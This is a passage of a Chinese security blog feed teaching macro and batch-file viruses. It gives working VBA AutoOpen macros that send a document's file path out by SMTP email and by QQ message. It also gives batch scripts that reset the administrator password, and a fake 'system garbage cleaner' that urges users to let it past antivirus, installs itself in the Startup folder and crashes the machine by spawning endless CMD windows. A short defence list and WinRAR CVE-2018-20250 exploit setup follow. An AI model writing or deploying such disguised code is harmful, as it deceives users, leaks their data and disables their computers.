class="number">25</span>               <span class="comment">&#x27;SMTP服务器端口</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpauthenticate&quot;</span>) = <span class="number">1</span>              <span class="comment">&#x27;是否开启用户名密码验证</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;sendusername&quot;</span>) = from1              <span class="comment">&#x27;发送方邮箱名称</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;sendpassword&quot;</span>) = password           <span class="comment">&#x27;发送方邮箱密码</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpusessl&quot;</span>) = <span class="literal">True</span>                 <span class="comment">&#x27;是否使用ssl协议</span></span><br><span class="line">        .Item(proxyUrl &amp; <span class="string">&quot;smtpconnectiontimeout&quot;</span>) = <span class="number">60</span>        <span class="comment">&#x27;时延</span></span><br><span class="line">        .Update</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 发送数据</span></span><br><span class="line">    CDO.Send</span><br><span class="line">    <span class="keyword">Set</span> CDO = <span class="literal">Nothing</span></span><br><span class="line">    MsgBox (<span class="string">&quot;成功!&quot;</span>)</span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>关闭文档，重新打开，出现弹窗：</p><img src="/posts/772b88a4/4.1.1.png" class="" title="路径"><img src="/posts/772b88a4/4.1.2.png" class="" title="发送邮件"><img src="/posts/772b88a4/4.1.3.png" class="" title="发送错误"><p>这是由于发送方没有开启SMTP服务导致的错误。开启SMTP服务后，<code>password</code>的值要修改为授权码，才可以发送成功。</p><img src="/posts/772b88a4/4.1.5.png" class="" title="开启SMTP服务"><img src="/posts/772b88a4/4.1.6.png" class="" title="发送成功"><p>在收信方的邮箱中可以看到发送方发送过来的文件在发送方电脑的绝对路径。</p><img src="/posts/772b88a4/4.1.4.png" class="" title="发送成功"><h1 id="5-案例：QQ发送消息"><a href="#5-案例：QQ发送消息" class="headerlink" title="5. 案例：QQ发送消息"></a>5. 案例：QQ发送消息</h1><p>接着通过QQ发送消息来制作宏病毒，并获取对方电脑存储的具体路径。具体流程：</p><ul><li>获取文件路径</li><li>将路径复制至剪贴板</li><li>发送QQ消息</li><li>通过sendkeys输入，Ctrl + V发送粘贴内容</li></ul><p>注意，腾讯WebQQ停止运营了，且不好获取QQ的聊天窗口句柄，才采用了该方法。</p><p>完整宏代码如下：</p><figure class="highlight vb"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">Sub</span> AutoOpen()</span><br><span class="line">    <span class="comment">&#x27; 获取文件路径</span></span><br><span class="line">    DocPath = ActiveDocument.Path</span><br><span class="line">    DocName = ActiveDocument.Name</span><br><span class="line">    Text1 = <span class="string">&quot;DocPath:&quot;</span> + DocPath</span><br><span class="line">    Text2 = <span class="string">&quot;DocName:&quot;</span> + DocName</span><br><span class="line">    Result = Text1 + Text2</span><br><span class="line">    MsgBox (Result)</span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 将内容送入剪贴板</span></span><br><span class="line">    <span class="keyword">With</span> CreateObject(<span class="string">&quot;new:&#123;1C3B4210-F441-11CE-B9EA-00AA006B1A69&#125;&quot;</span>)</span><br><span class="line">        .SetText Result</span><br><span class="line">        .PutInClipboard</span><br><span class="line">    <span class="keyword">End</span> <span class="keyword">With</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 发送QQ消息</span></span><br><span class="line">Shell <span class="string">&quot;cmd /c start tencent://Message/?Uin=收到消息的QQ号码&amp;weName=qzone.qq.com &amp; Menu=yes&quot;</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">Dim</span> t <span class="keyword">As</span> <span class="type">Single</span></span><br><span class="line">    t = Timer</span><br><span class="line">    <span class="keyword">Do</span></span><br><span class="line">      DoEvents</span><br><span class="line">    <span class="keyword">Loop</span> <span class="keyword">While</span> Timer - t &lt; <span class="number">2</span>    <span class="comment">&#x27;搁置2s</span></span><br><span class="line">    </span><br><span class="line">    <span class="comment">&#x27; 粘贴</span></span><br><span class="line">    SendKeys <span class="string">&quot;^v&quot;</span></span><br><span class="line">    SendKeys <span class="string">&quot;&#123;ENTER&#125;&quot;</span></span><br><span class="line">    SendKeys <span class="string">&quot;&#123;ENTER&#125;&quot;</span></span><br><span class="line">    SendKeys <span class="string">&quot;^&#123;ENTER&#125;&quot;</span></span><br><span class="line"><span class="keyword">End</span> <span class="keyword">Sub</span></span><br></pre></td></tr></table></figure><p>关闭文档，重新打开，出现弹窗：</p><img src="/posts/772b88a4/5.1.1.png" class="" title="路径"><p>点击确定后，直接向指定联系人发送Word文档在当前用户的绝对路径。当然，前提是用户已经在电脑上登录了QQ。</p><img src="/posts/772b88a4/5.1.2.png" class="" title="路径"><h1 id="6-网络攻击中的宏病毒"><a href="#6-网络攻击中的宏病毒" class="headerlink" title="6. 网络攻击中的宏病毒"></a>6. 网络攻击中的宏病毒</h1><p>APT28组织是一个与俄罗斯政府有关的高级攻击团伙，我将通过分析该组织的攻击样本、攻击方法、攻击目的来研究一个APT组织。本次分析的是该团伙使用的宏病毒，所有资料均来自互联网。</p><p>此次分析的样本一共如下三个：<br>攻击时间 攻击具体目标 发现安全公司 投递方式</p><ul><li>2018年10月到11月 欧洲外交处理事务政府组织 paloalto 鱼叉邮件</li><li>2017年7月到8月 酒店行业 Fireeye 鱼叉邮件</li><li>2017年10月 美国研究机构 cisco 鱼叉邮件</li></ul><p>具体的宏病毒分析看<a href="https://xz.aliyun.com/t/3427">https://xz.aliyun.com/t/3427</a></p>]]></content>
    
    
    <summary type="html">&lt;p&gt;宏病毒是Windows平台病毒中的一类，它是一种寄存在文档或模板的宏中的计算机病毒。一旦打开这样的文档，其中的宏就会被执行，于是宏病毒就会被激活，转移到计算机上，并驻留在Normal模板上。从此以后，所有自动保存的文档都会“感染”上这种宏病毒，而且如果其他用户打开了感染病毒的文档，宏病毒又会转移到他的计算机上。&lt;/p&gt;</summary>
    
    
    
    <category term="Windows逆向" scheme="http://example.com/categories/Windows%E9%80%86%E5%90%91/"/>
    
    
  </entry>
  
  <entry>
    <title>批处理病毒攻防机理</title>
    <link href="http://example.com/posts/82a69c8b.html"/>
    <id>http://example.com/posts/82a69c8b.html</id>
    <published>2022-06-30T06:13:22.833Z</published>
    <updated>2022-07-02T05:48:38.400Z</updated>
    
    <content type="html"><![CDATA[<p><code>.bat</code>文件是DOS下的批处理文件。批处理文件是无格式的文本文件，它包含一条或多条命令。它的文件扩展名为<code>.bat</code>或<code>.cmd</code>。在命令提示下输入批处理文件的名称，或者双击该批处理文件，系统就会调用<code>cmd.exe</code>按照该文件中各个命令出现的顺序依次运行它们。使用批处理文件或脚本，可以简化日常或重复性任务。攻击者通常通过批处理文件的编写来实现多工具的组合入侵、自动入侵及结果提取等功能。</p><span id="more"></span><h1 id="1-批处理病毒机理"><a href="#1-批处理病毒机理" class="headerlink" title="1. 批处理病毒机理"></a>1. 批处理病毒机理</h1><h2 id="1-1-修改密码和定时关机脚本"><a href="#1-1-修改密码和定时关机脚本" class="headerlink" title="1.1 修改密码和定时关机脚本"></a>1.1 修改密码和定时关机脚本</h2><p>编写并运行批处理脚本的基本步骤如下：</p><ol><li>新建文本文档</li><li>输入批处理命令</li><li>将扩展名改为<code>.bat</code></li><li>双击批处理文件运行</li></ol><p>关机命令为<code>shutdown</code>，基本命令为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">//现在让系统600s后关机</span><br><span class="line">shutdown -s -t 600</span><br><span class="line"></span><br><span class="line">//终止关闭计算机</span><br><span class="line">shutdown -a</span><br></pre></td></tr></table></figure><img src="/posts/82a69c8b/1.1.1.png" class="" title="关机命令"><p>更多有关<code>shutdown</code>的用法可通过CMD查看。</p><img src="/posts/82a69c8b/1.1.2.png" class="" title="shutdown命令用法"><p>运用在批处理脚本中，也是一样的。如果需要终止关机需在CMD输入相应命令。</p><img src="/posts/82a69c8b/1.1.3.png" class="" title="关机命令"><img src="/posts/82a69c8b/1.1.4.png" class="" title="关机命令"><p>了解了基本的批处理脚本的运行方式后，接下来进行一个比较完整的bat脚本制作过程，这些代码对批处理功能熟悉和脚本病毒逆向分析都有帮助。</p><p>新建一个<code>v5le0n9.bat</code>，程序编写如下所示：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title v5le0n9在此</span><br><span class="line"></span><br><span class="line">echo ===================================</span><br><span class="line">echo                 菜单</span><br><span class="line">echo           1.修改管理员密码</span><br><span class="line">echo           2.定时关机</span><br><span class="line">echo           3.退出本程序</span><br><span class="line">echo ===================================</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>其中“@echo off”表示关闭回显，“color 0a”表示设置颜色。双击文件显示如下：</p><img src="/posts/82a69c8b/1.1.5.png" class="" title="显示结果"><p>继续完善代码，可以让用户进行选择，达到交互目的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title v5le0n9在此</span><br><span class="line"></span><br><span class="line">echo ===================================</span><br><span class="line">echo                 菜单</span><br><span class="line">echo           1.修改管理员密码</span><br><span class="line">echo           2.定时关机</span><br><span class="line">echo           3.退出本程序</span><br><span class="line">echo ===================================</span><br><span class="line"></span><br><span class="line">set /p num=您的选择是：</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>“set /p num=您的选择是：”表示设置变量num等待用户输入，其中“/p”表示暂停并等待用户输入，“num=您的选择是：”表示用户在“您的选择是：”后输入的值赋给num。</p><img src="/posts/82a69c8b/1.1.6.png" class="" title="显示结果"><p>接下来就是选择选项后要执行的命令：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">//修改管理员密码为123456</span><br><span class="line">net user administrator 123456</span><br><span class="line"></span><br><span class="line">//100s后关机</span><br><span class="line">shutdown -s -t 100</span><br><span class="line"></span><br><span class="line">//退出本程序</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><p>知道这些命令后再将这些命令放入到批处理脚本中。其中“&gt;nul”表示不输出运行提示信息。虽然goto语句不提倡使用，但某些情况还是挺便捷的。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title v5le0n9在此</span><br><span class="line"></span><br><span class="line">:menu</span><br><span class="line">echo ===================================</span><br><span class="line">echo                 菜单</span><br><span class="line">echo           1.修改管理员密码</span><br><span class="line">echo           2.定时关机</span><br><span class="line">echo           3.退出本程序</span><br><span class="line">echo ===================================</span><br><span class="line"></span><br><span class="line">set /p num=您的选择是：</span><br><span class="line">if &quot;%num%&quot;==&quot;1&quot; goto 1</span><br><span class="line">if &quot;%num%&quot;==&quot;2&quot; goto 2</span><br><span class="line">if &quot;%num%&quot;==&quot;3&quot; goto 3</span><br><span class="line"></span><br><span class="line">:1</span><br><span class="line">net user administrator 123456 &gt; nul</span><br><span class="line">echo 您的密码已经设置成功！</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:2</span><br><span class="line">shutdown -s -t 100</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:3</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><img src="/posts/82a69c8b/1.1.7.png" class="" title="显示结果"><p>显示拒绝访问，并且重启发现密码没有修改成功，这是因为普通用户没有权限。需要“以管理员身份运行”批处理脚本才能修改成功。</p><img src="/posts/82a69c8b/1.1.8.png" class="" title="显示结果"><p>继续完善脚本功能：</p><ul><li>增加“cls”命令清屏</li><li>为了避免输入其它数字会从头执行到尾，补充一个提示信息</li><li>最后补充设置的用户名和新密码，关机时间等</li></ul><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">color 0a</span><br><span class="line">title v5le0n9在此</span><br><span class="line"></span><br><span class="line">:menu</span><br><span class="line">cls</span><br><span class="line">echo ===================================</span><br><span class="line">echo                 菜单</span><br><span class="line">echo           1.修改管理员密码</span><br><span class="line">echo           2.定时关机</span><br><span class="line">echo           3.退出本程序</span><br><span class="line">echo ===================================</span><br><span class="line"></span><br><span class="line">set /p num=您的选择是：</span><br><span class="line">if &quot;%num%&quot;==&quot;1&quot; goto 1</span><br><span class="line">if &quot;%num%&quot;==&quot;2&quot; goto 2</span><br><span class="line">if &quot;%num%&quot;==&quot;3&quot; goto 3</span><br><span class="line"></span><br><span class="line">echo 您好！请输入1-3正确的数字</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:1</span><br><span class="line">set /p u=请输入用户名:</span><br><span class="line">set /p p=请输入新密码:</span><br><span class="line">net user %u% %p% &gt;nul</span><br><span class="line">echo 您的密码已经设置成功！</span><br><span class="line">pause</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:2</span><br><span class="line">set /p time=请输入时间:</span><br><span class="line">shutdown -s -t %time%</span><br><span class="line">goto menu</span><br><span class="line"></span><br><span class="line">:3</span><br><span class="line">exit</span><br></pre></td></tr></table></figure><h2 id="1-2-脚本病毒防御机制"><a href="#1-2-脚本病毒防御机制" class="headerlink" title="1.2 脚本病毒防御机制"></a>1.2 脚本病毒防御机制</h2><p>上面主要介绍了批处理脚本实现关机和修改管理员密码的功能，但在真正的网络攻防过程中，脚本病毒和宏病毒更常见，这里分享下它们的防御方法。</p><p>脚本病毒主要采用脚本语言设计的计算机病毒。现在流行的脚本病毒大都是利用JavaScript和VBScript脚本语言编写。实际上在早期的系统中，病毒就已经开始利用脚本进行传播和破坏，不过专门的脚本型病毒并不常见。但是在脚本应用无所不在的今天，脚本病毒却成为危害大、传播广的病毒，特别是当它们和一些传统的进行恶性破坏的病毒如CIH相结合时，其危害就更严重了。</p><p>随着计算机系统软件技术的发展，新的病毒技术也应运而生，特别是结合脚本技术的病毒更让人防不胜防，比如在APT中鱼叉式钓鱼邮件结合宏病毒(Office文档)就很常见。由于脚本语言的易用性，并且脚本在现有应用系统中特别是Internet应用中占据了重要地位，脚本病毒也成为互联网病毒中最为流行的网络病毒之一。常见脚本文件后缀有：<code>.VBS</code>、<code>.VBE</code>、<code>.JS</code>、<code>.BAT</code>、<code>.CMD</code>。</p><p>常见的防御措施包括：</p><ul><li>防范VBS(Visual Basic Script)脚本病毒，比如禁用文件系统对象<code>regsvr32 scrrun.dll/u</code></li><li>在浏览器设置中将ActiveX插件和控件以及JS相关功能禁止掉，这样可以避免一些恶意代码的攻击，不过也会限制一些制作精美的动态网页</li><li>及时升级系统和浏览器补丁，选择一款好的防病毒软件并做好及时升级</li><li>防止鱼叉式钓鱼邮件攻击，不要轻易去浏览或点击一些来历不明的网站、邮件、文件，这样大部分的恶意代码都会被我们拒之“机”外</li><li>小心处理Office文档，除非确认文档来源可靠，充分了解打开文档的后果，否则务必不要开启Office启用宏代码</li><li>使用云沙箱和本地安全软件对可疑文件进行检测</li><li>提升安全意识，尤其内部人员的安全意识</li></ul><h1 id="2-自启动恶意攻击机理"><a href="#2-自启动恶意攻击机理" class="headerlink" title="2. 自启动恶意攻击机理"></a>2. 自启动恶意攻击机理</h1><p>当计算机重启后，病毒自启动是一个重要的功能。常用方法包括：</p><ul><li><p>病毒融合Autoruns自启动机制</p></li><li><p>利用系统自动播放机制<code>Autorun.inf</code></p><p>比如U盘病毒或光盘病毒就是利用U盘或光盘的自动播放功能。目前，也有一些U盘插入后，不需要双击U盘，里面的程序就会自启动。</p></li><li><p>在其它可执行文件嵌入少量触发代码</p><p>修改引入函数节启动DLL病毒文件(添加相应结构，初始化代码触发)，在特定PE文件代码段插入触发代码等(只需定位可执行程序并运行)。</p></li><li><p>DLL劫持：替换已有DLL文件</p><p>很多应用程序或操作系统执行时，都会去执行DLL文件，如果病毒将自身做成一个DLL文件，同时将系统DLL文件替换。可想而知，系统启动时，它是根据文件名启动的，此时病毒DLL文件就会拿到控制权，如果拿到控制权之后再进一步装载原始DLL文件，这样系统的本身机制也不会受影响，隐蔽性更强。该方法非常常见，甚至有一些病毒程序将反病毒软件可依赖的DLL文件替换。</p></li><li><p>利用0day或1day漏洞实现自启动</p></li></ul><h2 id="2-1-BAT脚本实现自启动"><a href="#2-1-BAT脚本实现自启动" class="headerlink" title="2.1 BAT脚本实现自启动"></a>2.1 BAT脚本实现自启动</h2><p>现在尝试编写一个伪装成“系统垃圾清理”的程序，它其实是一个导致系统死机的程序，其原理是不断打开CMD程序，占用系统资源从而导致死机，并且每次开机都会自启动。</p><p>创建批处理文件<code>clean.bat</code>，“::”表示注释，“&gt;”表示清空重写，“&gt;&gt;”表示追加命令到文件末尾，“%0”表示再次执行该程序。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">::每次运行clean.bat都重写自身，写入命令start cmd</span><br><span class="line">echo start cmd &gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">::每运行一次clean.bat增加一条start cmd命令</span><br><span class="line">echo start cmd &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">::每运行一次clean.bat增加一条打开clean.bat命令</span><br><span class="line">echo %0 &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br></pre></td></tr></table></figure><p>如果是命令1与命令3结合，第一次运行到命令1后，<code>clean.bat</code>被重写，命令3被清掉了，无法实现“不断打开CMD程序”。如果是命令2与命令3结合，第一次运行到命令2后，在文件末尾追加“start cmd”命令并打开CMD窗口，运行到命令3后，在文件末尾追加“C:\Users\Leong\Desktop\clean.bat”命令并打开<code>clean.bat</code>。此时<code>clean.bat</code>文件内容如下，但读入内存的旧的<code>clean.bat</code>已经执行完了。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">::每运行一次clean.bat增加一条start cmd命令</span><br><span class="line">echo start cmd &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">::每运行一次clean.bat打开一个clean.bat</span><br><span class="line">echo %0 &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">start cmd </span><br><span class="line">&quot;C:\Users\Leong\Desktop\clean.bat&quot; </span><br></pre></td></tr></table></figure><p>因为旧的<code>clean.bat</code>在执行结束前将新的<code>clean.bat</code>读入内存，紧接着从头开始运行新的<code>clean.bat</code>文件，到命令2后，在文件末尾追加“start cmd”命令并打开CMD窗口，运行到命令3后，在文件末尾追加“C:\Users\Leong\Desktop\clean.bat”命令并打开最新的<code>clean.bat</code>，此时程序更新为：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">::每运行一次clean.bat增加一条start cmd命令</span><br><span class="line">echo start cmd &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">::每运行一次clean.bat打开一个clean.bat</span><br><span class="line">echo %0 &gt;&gt; C:\Users\Leong\Desktop\clean.bat</span><br><span class="line"></span><br><span class="line">start cmd </span><br><span class="line">&quot;C:\Users\Leong\Desktop\clean.bat&quot; </span><br><span class="line">start cmd </span><br><span class="line">&quot;C:\Users\Leong\Desktop\clean.bat&quot; </span><br></pre></td></tr></table></figure><p>但新的<code>clean.bat</code>还有两条指令没执行完，在打开最新的<code>clean.bat</code>后继续往下执行。最新的<code>clean.bat</code>从头开始执行。以此类推，程序不断打开CMD窗口，占用系统资源，导致系统瘫痪。</p><img src="/posts/82a69c8b/2.1.1.png" class="" title="显示结果"><p>当然也可以不用那么复杂，直接在批处理脚本中输入以下命令即可实现破坏功能：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">start cmd</span><br><span class="line">C:\Users\Leong\Desktop\clean.bat</span><br></pre></td></tr></table></figure><p>以上只能让用户死机一次，重启系统后，用户不再打开这个文件就不会中招。所以为了跳过用户启动的步骤，可以把程序放在自启动中。</p><p>errorlevel为预定义变量，随着系统变化而变化。如果为0表示上一条命令执行成功，如果为1表示上一条命令执行失败。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line">@echo off</span><br><span class="line">title 系统垃圾清理</span><br><span class="line">color 2f</span><br><span class="line">echo =====若有杀毒软件恶意拦截，请选择【允许程序的所有操作】=====</span><br><span class="line">::echo.表示空行</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line"></span><br><span class="line">::Win 7及以上运行这个命令，将批处理脚本拷贝到自启动项中</span><br><span class="line">copy C:\Users\Leong\Desktop\clean.bat &quot;%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\&quot;&gt;nul</span><br><span class="line">if %errorlevel%==0 goto next</span><br><span class="line"></span><br><span class="line">::Win 7以下运行这个命令</span><br><span class="line">copy C:\Users\Leong\Desktop\clean.bat &quot;%USERPROFILE%\「开始」菜单\程序\启动\&quot;&gt;nul</span><br><span class="line">if %errorlevel%==0 goto next</span><br><span class="line"></span><br><span class="line">:error</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo ======程序运行失败，请【使用管理员权限】重新运行！======</span><br><span class="line">echo.</span><br><span class="line">pause</span><br><span class="line"></span><br><span class="line">:next</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo =========垃圾清理中，请不要关闭窗口=========</span><br><span class="line">echo.</span><br><span class="line">::ping在这里的作用是延长时间，伪装在清理垃圾</span><br><span class="line">ping -n 5 127.0.0.1&gt;nul</span><br><span class="line">echo.</span><br><span class="line">echo =========垃圾清理完毕,共清理垃圾500M=======</span><br><span class="line">echo.</span><br><span class="line">echo.</span><br><span class="line">echo =========建议立即重启电脑==========</span><br><span class="line"></span><br><span class="line">echo start cmd &gt; &quot;%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\clean.bat&quot;</span><br><span class="line">echo &quot;%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\clean.bat&quot; &gt;&gt; &quot;%USERPROFILE%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\clean.bat&quot;</span><br><span class="line"></span><br><span class="line">pause</span><br></pre></td></tr></table></figure><p>血的教训，最好把路径用引号括起来，否则可能执行不成功。</p><p>“以管理员身份运行”，在Win 7中其实普通用户也可以。</p><img src="/posts/82a69c8b/2.1.2.png" class="" title="显示结果"><p>检查自启动目录是否创建了批处理脚本，双击它的确能不断打开CMD占用系统资源。</p><img src="/posts/82a69c8b/2.1.3.png" class="" title="自启动目录的clean.bat"><p>现在重启电脑测试是否能实现自启动。完美！</p><img src="/posts/82a69c8b/2.1.4.png" class="" title="显示结果"><h2 id="2-2-WinRAR恶意劫持自启动-CVE-2018-20250"><a href="#2-2-WinRAR恶意劫持自启动-CVE-2018-20250" class="headerlink" title="2.2 WinRAR恶意劫持自启动(CVE-2018-20250)"></a>2.2 WinRAR恶意劫持自启动(CVE-2018-20250)</h2><h3 id="2-2-1-漏洞描述"><a href="#2-2-1-漏洞描述" class="headerlink" title="2.2.1 漏洞描述"></a>2.2.1 漏洞描述</h3><p>WinRAR漏洞(CVE-2018-20250)是Check Point团队于2019年2月爆出的严重安全漏洞，该漏洞已存在于WinRAR中19年，是APT攻击中非常经典的漏洞。它是由于WinRAR使用一个陈旧的<code>UNACEV2.dll</code>动态链接库造成的。当我们解压任意ACE文件时，由于没有对文件名进行充分过滤，导致其可实现目录穿越，将恶意软件写入操作系统自启动文件夹，导致电脑重启时会自动运行该程序，从而造成恶意软件劫持。</p><h3 id="2-2-2-影响范围"><a href="#2-2-2-影响范围" class="headerlink" title="2.2.2 影响范围"></a>2.2.2 影响范围</h3><p>该漏洞会对多种压缩软件造成影响，版本如下：</p><ul><li>WinRAR &lt; v5.70 Beta 1</li><li>Bandizip &lt;= v6.2.0.0</li><li>好压(245压缩) &lt;= v5.9.8.10907</li><li>360压缩 &lt;= v4.0.0.1170</li></ul><h3 id="2-2-3-漏洞复现"><a href="#2-2-3-漏洞复现" class="headerlink" title="2.2.3 漏洞复现"></a>2.2.3 漏洞复现</h3><h4 id="2-2-3-1-环境配置"><a href="#2-2-3-1-环境配置" class="headerlink" title="2.2.3.1 环境配置"></a>2.2.3.1 环境配置</h4><p>攻击机：Windows 10 家庭版 x64</p><p>靶机：Windows 10 教育版 x64</p><p>利用工具：<a href="https://github.com/backlion/CVE-2018-20250">https://github.com/backlion/CVE-2018-20250</a></p><h4 id="2-2-3-2-复现准备"><a href="#2-2-3-2-复现准备" class="headerlink" title="2.2.3.2 复现准备"></a>2.2.3.2 复现准备</h4><p>在靶机上下载好<a href="https://pan.baidu.com/s/16eL9rA1gj9FdoBmLh3oieg">WinRAR v5.4</a>(提取码：lo3r)，安装之后可以看到本地WinRAR目录下的<code>UNACEV2.dll</code>动态链接库，这个就是被利用的入口。</p><img src="/posts/82a69c8b/2.1.5.png" class="" 